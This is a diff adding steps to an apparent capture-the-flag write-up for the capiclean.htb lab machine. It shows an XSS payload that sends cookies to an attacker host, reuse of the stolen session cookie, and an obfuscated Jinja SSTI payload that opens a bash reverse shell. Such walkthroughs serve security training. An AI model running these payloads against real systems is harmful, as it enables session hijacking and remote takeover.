@@ -35,4 +35,54 @@ http://capiclean.htb
 
 ![image](https://github.com/zer00d4y/writeups/assets/128820441/82f197be-44fd-4dbc-a912-8be4e5a407cb)
 
+Open capiclean.htb/quote and intercept the request
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/b454619e-2b9c-4da4-b734-5bc84c8094bd)
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/bdaa2334-f3f7-41a4-b5f9-4b1fdc79f708)
+
+## XSS
+
+Payload:
+
+    <img src=x onerror=fetch("http://ATTACK_IP:PORT/"+document.cookie);>
+
+URLencoded payload:
+
+    <img+src%3dx+onerror%3dfetch("http%3a//ATTACK_IP%3aPORT/"%2bdocument.cookie)%3b>&email=test%40test.test
+
+Start python server
+
+Paste our XSS payload in `service` section
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/13506a92-7321-430a-9be5-b1c4ba8b8b26)
+
+Cookie: 
+
+    eyJyb2xlIjoiMjEyMzJmMjk3YTU3YTVhNzQzODk0YTBlNGE4MDFmYzMifQ.Zh02rQ.FPqIYAKIFgs_W8kHStG34YIeMqo 
+
+Set cookie named `session`
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/3b5b7da7-da0e-488c-8e34-6200e27d0ce2)
+
+http://capiclean.htb/dashboard
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/821575d0-15ee-4e34-83b6-9f47180ea515)
+
+## SSTI
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/fca10c48-e13f-4354-8629-11408567f71d)
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/e8b0a1d4-10a6-44fe-8ad6-7f6e3b20812d)
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/5ef872b3-d0bd-434c-b1c3-f1db14b45267)
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/d85cf6b0-25e1-4297-8524-e97700f06d8e)
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/acf0bbd0-70a8-41e8-a372-1f7a357e579f)
+
+![image](https://github.com/zer00d4y/writeups/assets/128820441/46ffbe82-e5ff-451d-9a9c-4687eec2c3b6)
+
+    {{request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fbuiltins\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("\x5f\x5fimport\x5f\x5f")("os")|attr("popen")("bash -c '/bin/bash -i >& /dev/tcp/ATTACK_IP/PORT 0>&1'")|attr("read")()}}
+
 
